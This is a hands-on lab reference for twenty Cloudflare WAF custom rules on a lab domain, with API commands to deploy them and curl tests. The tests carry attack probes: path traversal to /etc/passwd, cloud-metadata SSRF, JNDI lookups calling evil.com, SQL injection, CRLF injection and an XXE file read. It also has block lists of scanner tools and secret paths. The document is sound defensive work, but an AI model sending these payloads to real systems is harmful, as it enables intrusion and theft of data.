# Top 20 Advanced Cloudflare WAF Custom Rules

Hands-on reference for advanced Cloudflare WAF engineering and lab work on **mslearn.site**.

| Item | Value |
|------|--------|
| Zone | Your lab domain (e.g. `mslearn.site`) — set `CLOUDFLARE_ZONE_NAME` in `.env` |
| Zone ID | Set `CLOUDFLARE_ZONE_ID` in `.env` (from dashboard or `scripts/list_zones.py`) |
| Custom WAF ruleset ID | Set `CLOUDFLARE_CUSTOM_RULESET_ID` in `.env` (WAF → Custom rules → API) |
| Phase | `http_request_firewall_custom` |
| Sandbox API base | `https://api.cloudflare.com/client/v4` |

---

## Before you start

### Free plan limits

| Limit | Free plan |
|-------|-----------|
| Custom WAF rules (zone) | **5 max** |
| `log` action | **No** (Enterprise only) |
| Regex `matches` | **No** — use `contains`, `in {}`, `starts_with()` |
| Custom rulesets (zone) | 1 |

**Deployed lab rules (5/5):** Rules **#1, #2, #3, #4, #5** below are live on `mslearn.site`. Rules **#6–#20** are documented for learning, advanced deployments, and upgrade paths — merge expressions or upgrade plan to deploy all.

### Expression syntax (API vs dashboard)

The API requires **function form**:

```text
starts_with(http.request.uri.path, "/api/")     ✅ API
http.request.uri.path starts_with "/api/"       ❌ API (may fail parse)
```

### Environment variables

Copy `.env.example` to `.env` and fill in your values. Do **not** commit `.env`.

```bash
export CLOUDFLARE_API_TOKEN="your_cloudflare_api_token"
export CLOUDFLARE_ZONE_ID="your_zone_id_here"
export CLOUDFLARE_CUSTOM_RULESET_ID="your_custom_ruleset_id_here"
```

Find zone ID: `python scripts/list_zones.py` or Cloudflare dashboard → domain → Overview (right sidebar).

### Generic API command (add one rule)

```bash
curl -X POST \
  "https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/rulesets/${CLOUDFLARE_CUSTOM_RULESET_ID}/rules" \
  -H "Authorization: Bearer ${CLOUDFLARE_API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "description": "RULE_NAME_HERE",
    "expression": "EXPRESSION_HERE",
    "action": "block",
    "enabled": true
  }'
```

### How to read curl results

| HTTP code | Meaning |
|-----------|---------|
| **403** + Cloudflare block page | WAF custom rule matched — **success for block tests** |
| **522** | WAF allowed request; origin unreachable (no backend) — **pass for WAF** |
| **404** | WAF allowed; origin responded — **pass for WAF** |
| **200** | Allowed end-to-end |

Always note **CF-RAY** from response headers and correlate in **Security → Events**.

---

## Rule 1 — Base64-encoded host allowlist (API connect)

**Status:** ✅ Deployed on `mslearn.site`

### What it does

Decodes a base64 (and URL-encoded) `target` query parameter, normalizes to lowercase, and **blocks** requests to `/api/connect` when the decoded hostname is **not** in an allowlist. Stops attackers from passing arbitrary internal/external hosts via encoded parameters.

### Attack pattern

```http
GET /api/connect?target=<base64(evil.host)> HTTP/1.1
```

Bypasses naive rules that only inspect plain query strings.

### Expression

```text
(starts_with(http.request.uri.path, "/api/connect") and len(http.request.uri.args["target"][0]) > 0 and not lower(decode_base64(url_decode(http.request.uri.args["target"][0]))) in {"testhost.allowed.local" "lab.mslearn.site"})
```

| Field | Value |
|-------|--------|
| Action | `block` |
| Description | `LAB block unknown base64 host on /api/connect` |

### Create via API

```bash
curl -X POST \
  "https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/rulesets/${CLOUDFLARE_CUSTOM_RULESET_ID}/rules" \
  -H "Authorization: Bearer ${CLOUDFLARE_API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "description": "LAB block unknown base64 host on /api/connect",
    "expression": "(starts_with(http.request.uri.path, \"/api/connect\") and len(http.request.uri.args[\"target\"][0]) > 0 and not lower(decode_base64(url_decode(http.request.uri.args[\"target\"][0]))) in {\"testhost.allowed.local\" \"lab.mslearn.site\"})",
    "action": "block",
    "enabled": true
  }'
```

### Test hosts (base64 reference)

| Decoded host | Base64 `target` value |
|--------------|----------------------|
| `testhost.allowed.local` | `dGVzdGhvc3QuYWxsb3dlZC5sb2NhbA==` |
| `lab.mslearn.site` | `bGFiLm1zbGVhcm4uc2l0ZQ==` |
| `evil.host.blocked` | `ZXZpbC5ob3N0LmJsb2NrZWQ=` |

### Validate with curl

```bash
# BLOCK (403)
curl -i "https://mslearn.site/api/connect?target=ZXZpbC5ob3N0LmJsb2NrZWQ="

# PASS WAF — may 522 if no origin (403 = blocked)
curl -i "https://mslearn.site/api/connect?target=dGVzdGhvc3QuYWxsb3dlZC5sb2NhbA=="
```

### Engineering note

> Decode order: `url_decode` then `decode_base64`, then `lower()`. Deploy in log/skip on Free; enforce block after validating in Security Events.

---

## Rule 2 — Double-encoded path traversal

**Status:** ✅ Deployed (merged with Rule 3)

### What it does

Blocks directory traversal in API paths using literal `..`, encoded `%2e%2e`, and **recursively URL-decoded** path/query.

### Attack pattern

```http
GET /api/users/%252e%252e%252fadmin HTTP/1.1
```

WAF sees encoded bytes; app may decode to `/api/admin`.

### Expression (standalone)

```text
(starts_with(http.request.uri.path, "/api/") and (http.request.uri.path contains "%2e%2e" or http.request.uri.path contains ".." or url_decode(http.request.uri.path, "r") contains ".." or url_decode(http.request.uri.query, "r") contains "../"))
```

| Field | Value |
|-------|--------|
| Action | `block` |

### Validate with curl

```bash
# BLOCK (403) — confirmed on mslearn.site
curl -i "https://mslearn.site/api/users/%252e%252e%252fadmin"

# BLOCK
curl -i "https://mslearn.site/api/files/../../etc/passwd"

# PASS WAF
curl -i "https://mslearn.site/api/users/profile"
```

---

## Rule 3 — SSRF / cloud metadata probes

**Status:** ✅ Deployed (merged with Rule 2)

### What it does

Blocks API requests whose query string (recursively decoded) contains cloud metadata endpoints or localhost — common SSRF probes.

### Attack pattern

```http
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
```

### Expression (standalone)

```text
(starts_with(http.request.uri.path, "/api/") and (lower(url_decode(http.request.uri.query, "r")) contains "169.254.169.254" or lower(url_decode(http.request.uri.query, "r")) contains "metadata.google" or lower(url_decode(http.request.uri.query, "r")) contains "localhost" or lower(url_decode(http.request.uri.query, "r")) contains "127.0.0.1"))
```

| Field | Value |
|-------|--------|
| Action | `block` |
| Description (deployed) | `LAB block path traversal and SSRF probes on API` |

### Validate with curl

```bash
# BLOCK
curl -i "https://mslearn.site/api/connect?target=http://169.254.169.254/latest/meta-data/"

# BLOCK — base64 of 169.254.169.254
curl -i "https://mslearn.site/api/connect?target=MTY5LjI1NC4xNjkuMjU0"

# PASS WAF (allowed base64 host)
curl -i "https://mslearn.site/api/connect?target=dGVzdGhvc3QuYWxsb3dlZC5sb2NhbA=="
```

---

## Rule 4 — HTTP method override bypass

**Status:** ✅ Deployed (merged with Rule 5)

### What it does

Blocks verb tunneling headers used to bypass method-based WAF or app routing (`POST` + override `DELETE`).

### Attack pattern

```http
POST /api/user/123 HTTP/1.1
X-HTTP-Method-Override: DELETE
```

### Expression (standalone)

```text
(starts_with(http.request.uri.path, "/api/") and (len(http.request.headers["x-http-method-override"][0]) > 0 or len(http.request.headers["x-method-override"][0]) > 0 or len(http.request.headers["x-http-method"][0]) > 0))
```

| Field | Value |
|-------|--------|
| Action | `block` |
| Description (deployed) | `LAB block method override and spoofed CDN IP headers` |

### Validate with curl

```bash
# BLOCK
curl -i -X POST "https://mslearn.site/api/user/1" \
  -H "X-HTTP-Method-Override: DELETE"

# PASS WAF
curl -i -X POST "https://mslearn.site/api/user/1" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"test\"}"
```

---

## Rule 5 — Spoofed CDN / client identity headers

**Status:** ✅ Deployed (merged with Rule 4)

### What it does

Blocks client-supplied headers that only the edge should set — prevents IP allowlist / rate-limit bypass on origin.

### Attack pattern

```http
GET /api/admin HTTP/1.1
CF-Connecting-IP: 10.0.0.1
True-Client-IP: 10.0.0.1
```

### Expression (standalone)

```text
(len(http.request.headers["cf-connecting-ip"][0]) > 0 or len(http.request.headers["true-client-ip"][0]) > 0 or len(http.request.headers["x-azure-clientip"][0]) > 0)
```

| Field | Value |
|-------|--------|
| Action | `block` |

**Prod note:** Scope to `/api/admin` or strip headers at edge instead of zone-wide block if needed.

### Validate with curl

```bash
# BLOCK (403) — confirmed
curl -i "https://mslearn.site/api/connect" \
  -H "CF-Connecting-IP: 10.0.0.1"

curl -i "https://mslearn.site/api/connect" \
  -H "True-Client-IP: 203.0.113.1"
```

---

## Rule 6 — Host header allowlist + X-Forwarded-Host injection

**Status:** ✅ Deployed

### What it does

On `/api/*`, blocks wrong `Host` values and client-sent `X-Forwarded-Host` — mitigates cache poisoning and virtual-host abuse.

### Expression

```text
(starts_with(http.request.uri.path, "/api/") and (not lower(http.host) in {"mslearn.site" "www.mslearn.site"} or len(http.request.headers["x-forwarded-host"][0]) > 0))
```

| Field | Value |
|-------|--------|
| Action | `block` |
| Description | `LAB enforce host allowlist and block X-Forwarded-Host on API` |

### Create via API

```bash
curl -X POST \
  "https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/rulesets/${CLOUDFLARE_CUSTOM_RULESET_ID}/rules" \
  -H "Authorization: Bearer ${CLOUDFLARE_API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "description": "LAB enforce host allowlist and block X-Forwarded-Host on API",
    "expression": "(starts_with(http.request.uri.path, \"/api/\") and (not lower(http.host) in {\"mslearn.site\" \"www.mslearn.site\"} or len(http.request.headers[\"x-forwarded-host\"][0]) > 0))",
    "action": "block",
    "enabled": true
  }'
```

### Validate with curl

```bash
# BLOCK
curl -i "https://mslearn.site/api/connect" -H "Host: evil.com"

curl -i "https://mslearn.site/api/connect" \
  -H "Host: mslearn.site" \
  -H "X-Forwarded-Host: internal.admin.local"

# PASS
curl -i "https://mslearn.site/api/connect" -H "Host: mslearn.site"
```

---

## Rule 7 — Verified bot skip (good bots)

**Status:** ✅ Deployed on `mslearn.site`

### What it does

**Skips** remaining custom rules and managed WAF phases for verified bots — reduces false positives on crawlers while keeping strict rules for human/API traffic.

### Expression

```text
(cf.client.bot)
```

| Field | Value |
|-------|--------|
| Action | `skip` |
| Description | `good bot` |

### Free plan note

Use **Skip** + enable **“Log matching requests”** in dashboard (no `log` action on Free).

### Validate

Hard to curl-simulate; verify in Security Events when legitimate bots hit the site. Do **not** use `cf.client.bot` alone as sole security control.

---

## Rule 8 — Sensitive path / file probing

**Status:** 📄 Documented only (Free plan full)

### What it does

Blocks common recon paths: `.env`, `.git`, `wp-admin`, `actuator`, backup files.

### Expression

```text
(http.request.uri.path contains "/.env" or http.request.uri.path contains "/.git" or http.request.uri.path contains "/wp-admin" or http.request.uri.path contains "/actuator" or http.request.uri.path contains "/backup" or http.request.uri.path contains "/.aws/")
```

| Field | Value |
|-------|--------|
| Action | `block` |

### Create via API

```bash
curl -X POST \
  "https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/rulesets/${CLOUDFLARE_CUSTOM_RULESET_ID}/rules" \
  -H "Authorization: Bearer ${CLOUDFLARE_API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "description": "LAB block sensitive path probing",
    "expression": "(http.request.uri.path contains \"/.env\" or http.request.uri.path contains \"/.git\" or http.request.uri.path contains \"/wp-admin\" or http.request.uri.path contains \"/actuator\" or http.request.uri.path contains \"/backup\")",
    "action": "block",
    "enabled": true
  }'
```

### Validate with curl

```bash
curl -i "https://mslearn.site/.env"
curl -i "https://mslearn.site/.git/config"
curl -i "https://mslearn.site/wp-admin"
```

---

## Rule 9 — JNDI / Log4Shell-style injection probes

**Status:** 📄 Documented only

### What it does

Blocks `${jndi:` patterns in URI and User-Agent — still common in mass scanning.

### Expression

```text
(lower(http.request.uri.query) contains "$\{jndi" or lower(http.user_agent) contains "jndi:" or lower(http.request.uri.path) contains "$\{jndi")
```

| Field | Value |
|-------|--------|
| Action | `block` |

### Validate with curl

```bash
curl -i "https://mslearn.site/api/search?q=%24%7Bjndi:ldap://evil.com/a%7D"
curl -i "https://mslearn.site/" -H "User-Agent: \${jndi:ldap://evil.com}"
```

---

## Rule 10 — SQL injection keywords in query (shallow)

**Status:** 📄 Documented only

### What it does

Blocks obvious SQLi strings in query/body surface — **noisy**; use log mode on paid plans first. Good for lab/demo.

### Expression

```text
(starts_with(http.request.uri.path, "/api/") and (lower(http.request.uri.query) contains "union select" or lower(http.request.uri.query) contains "' or 1=1" or lower(http.request.uri.query) contains "drop table"))
```

| Field | Value |
|-------|--------|
| Action | `block` |

### Validate with curl

```bash
curl -i "https://mslearn.site/api/users?id=1'%20OR%201=1--"
curl -i "https://mslearn.site/api/search?q=1%20union%20select%20null"
```

---

## Rule 11 — CRLF / header injection in query

**Status:** 📄 Documented only

### What it does

Blocks `%0d%0a` (CRLF) in query string — response splitting / header injection attempts.

### Expression

```text
(http.request.uri.query contains "%0d%0a" or http.request.uri.query contains "%0D%0A" or url_decode(http.request.uri.query, "r") contains "\r\n")
```

| Field | Value |
|-------|--------|
| Action | `block` |

### Validate with curl

```bash
curl -i "https://mslearn.site/api/redirect?url=test%0d%0aSet-Cookie:%20admin=true"
```

---

## Rule 12 — Dangerous HTTP methods (TRACE, TRACK)

**Status:** 📄 Documented only

### What it does

Blocks cross-site tracing and non-standard methods on API surface.

### Expression

```text
(http.request.method in {"TRACE" "TRACK" "DEBUG"})
```

| Field | Value |
|-------|--------|
| Action | `block` |

### Validate with curl

```bash
curl -i -X TRACE "https://mslearn.site/api/connect"
curl -i -X DEBUG "https://mslearn.site/api/connect"
```

---

## Rule 13 — Empty or missing User-Agent on API

**Status:** 📄 Documented only

### What it does

Blocks scripts/scanners with no User-Agent on sensitive API paths.

### Expression

```text
(starts_with(http.request.uri.path, "/api/") and len(http.user_agent) == 0)
```

| Field | Value |
|-------|--------|
| Action | `managed_challenge` or `block` |

### Validate with curl

```bash
curl -i "https://mslearn.site/api/connect" -H "User-Agent:"
curl -i "https://mslearn.site/api/connect" -A ""
```

---

## Rule 14 — Known scanner User-Agent strings

**Status:** 📄 Documented only

### What it does

Blocks common offensive-security tool UAs on production APIs.

### Expression

```text
(lower(http.user_agent) contains "sqlmap" or lower(http.user_agent) contains "nikto" or lower(http.user_agent) contains "nmap" or lower(http.user_agent) contains "masscan" or lower(http.user_agent) contains "dirbuster")
```

| Field | Value |
|-------|--------|
| Action | `block` |

### Validate with curl

```bash
curl -i "https://mslearn.site/api/connect" -A "sqlmap/1.0"
curl -i "https://mslearn.site/api/connect" -A "Nikto/2.1.6"
```

---

## Rule 15 — Webhook without signature header (fintech / Mesh-style)

**Status:** 📄 Documented only

### What it does

Blocks unsigned POSTs to webhook paths — edge gate before HMAC validation in app (e.g. `X-Mesh-Signature-256`).

### Expression

```text
(starts_with(http.request.uri.path, "/webhook/") and len(http.request.headers["x-mesh-signature-256"][0]) == 0)
```

| Field | Value |
|-------|--------|
| Action | `block` |

### Validate with curl

```bash
# BLOCK
curl -i -X POST "https://mslearn.site/webhook/transfer" \
  -H "Content-Type: application/json" \
  -d '{"event":"transfer.succeeded"}'

# PASS WAF (app must still verify HMAC)
curl -i -X POST "https://mslearn.site/webhook/transfer" \
  -H "Content-Type: application/json" \
  -H "X-Mesh-Signature-256: dummy-for-waf-test" \
  -d '{"event":"transfer.succeeded"}'
```

---

## Rule 16 — Auth endpoint brute-force (rate limiting rule)

**Status:** 📄 Documented only — uses **rate limiting** phase, not custom WAF

### What it does

Rate limits `/api/v1/auth` by source IP — credential stuffing / password spray.

### Phase

`http_ratelimit` (separate ruleset in dashboard: **Security → WAF → Rate limiting rules**)

### Expression (matching criteria)

```text
starts_with(http.request.uri.path, "/api/v1/auth")
```

| Setting | Value |
|---------|--------|
| Characteristics | `ip.src` |
| Requests | 100 per 60 seconds |
| Action | block for 600 seconds |

### API (rate limit ruleset)

```bash
# Create via dashboard recommended on Free; API example:
curl -X POST \
  "https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/rulesets" \
  -H "Authorization: Bearer ${CLOUDFLARE_API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "LAB auth rate limit",
    "kind": "zone",
    "phase": "http_ratelimit",
    "rules": [{
      "description": "Rate limit auth endpoints",
      "expression": "starts_with(http.request.uri.path, \"/api/v1/auth\")",
      "action": "block",
      "enabled": true,
      "ratelimit": {
        "characteristics": ["ip.src"],
        "period": 60,
        "requests_per_period": 100,
        "mitigation_timeout": 600
      }
    }]
  }'
```

### Validate with curl

```bash
for i in $(seq 1 110); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST "https://mslearn.site/api/v1/auth/login" \
    -H "Content-Type: application/json" -d '{"user":"test","pass":"wrong"}'
done
# Expect 429 or block after threshold
```

---

## Rule 17 — Geo block on sensitive transfer API (example)

**Status:** 📄 Documented only

### What it does

Blocks high-risk countries on payment/transfer paths — compliance + fraud. **Tune for your business**; often combined with allowlists.

### Expression

```text
(starts_with(http.request.uri.path, "/api/v1/transfer") and ip.src.country in {"KP" "IR" "SY"})
```

| Field | Value |
|-------|--------|
| Action | `block` |

### Validate with curl

Cannot easily spoof country without VPN; test in Security Events or use Cloudflare’s **country override** in dev tools. Document observed behavior in your runbook.

---

## Rule 18 — Large query string (DoS / log bomb)

**Status:** 📄 Documented only

### What it does

Blocks abnormally long query strings — cheap DoS / log volume attack.

### Expression

```text
(len(http.request.uri.query) > 2048)
```

| Field | Value |
|-------|--------|
| Action | `block` |

### Validate with curl

```bash
# Generate long query
python -c "print('https://mslearn.site/api/search?q=' + 'A'*3000)" | xargs curl -i
```

---

## Rule 19 — XML/SSRF content-type on API (XXE surface)

**Status:** 📄 Documented only

### What it does

Blocks `application/xml` / `text/xml` POSTs to JSON-only APIs — reduces XXE attack surface.

### Expression

```text
(starts_with(http.request.uri.path, "/api/") and http.request.method eq "POST" and (lower(http.request.headers["content-type"][0]) contains "xml"))
```

| Field | Value |
|-------|--------|
| Action | `block` |

### Validate with curl

```bash
curl -i -X POST "https://mslearn.site/api/users" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

---

## Rule 20 — Admin API + spoofed X-Forwarded-For (combined trust boundary)

**Status:** 📄 Documented only

### What it does

On admin paths only: block if client sends `X-Forwarded-For` — stricter than Rule 5 for high-risk routes.

### Expression

```text
(starts_with(http.request.uri.path, "/api/admin") and len(http.request.headers["x-forwarded-for"][0]) > 0)
```

| Field | Value |
|-------|--------|
| Action | `block` |

### Validate with curl

```bash
curl -i "https://mslearn.site/api/admin/users" \
  -H "X-Forwarded-For: 10.0.0.1"
```

---

## Deploy all lab rules via script

Rules **#1–#6** (merged as 5 on Free) are deployed by:

```bash
cd cloudflare-security-lab
python scripts/deploy_advanced_waf_rules.py
python scripts/add_base64_waf_rule.py
```

Requires `.env` with `CLOUDFLARE_API_TOKEN`.

---

## Merging rules to fit Free plan (5 max)

Example: combine Rules 2 + 3 (traversal + SSRF) into one expression with `or` — as deployed on `mslearn.site`.

| Slot | Merged rules |
|------|----------------|
| 1 | Rule 7 — good bot skip |
| 2 | Rule 1 — base64 host |
| 3 | Rules 2 + 3 — traversal + SSRF |
| 4 | Rules 4 + 5 — method override + spoofed IP |
| 5 | Rule 6 — host allowlist |

To add Rules 8–20: upgrade plan, remove `good bot` skip, or merge more with `or`.

---

## Delete a rule via API

```bash
curl -X DELETE \
  "https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/rulesets/${CLOUDFLARE_CUSTOM_RULESET_ID}/rules/RULE_ID_HERE" \
  -H "Authorization: Bearer ${CLOUDFLARE_API_TOKEN}"
```

---

## Quick reference

| Topic | Key phrase |
|-------|------------|
| 403 vs 522 | 403 = WAF blocked; 522 = WAF passed, origin dead |
| Base64 bypass | `url_decode` → `decode_base64` → `lower()` → allowlist |
| Traversal | Match `%2e%2e` and `url_decode(..., "r")` |
| Trust headers | Only edge sets `CF-Connecting-IP`; strip client copies |
| Free plan | 5 rules, no `log`, no regex — use `contains` / `in` |
| Fintech | Webhook signature at edge + HMAC on raw body in app |
| Mesh | `X-Client-Id` / `X-Client-Secret` server-side only |

---

## References

- [Cloudflare Custom Rules](https://developers.cloudflare.com/waf/custom-rules/)
- [Rules language functions](https://developers.cloudflare.com/ruleset-engine/rules-language/functions/)
- [Skip action (Free logging)](https://developers.cloudflare.com/waf/custom-rules/skip/)
- [Rulesets API](https://developers.cloudflare.com/ruleset-engine/rulesets-api/)

---

*Lab domain: mslearn.site · Last updated: June 2026*
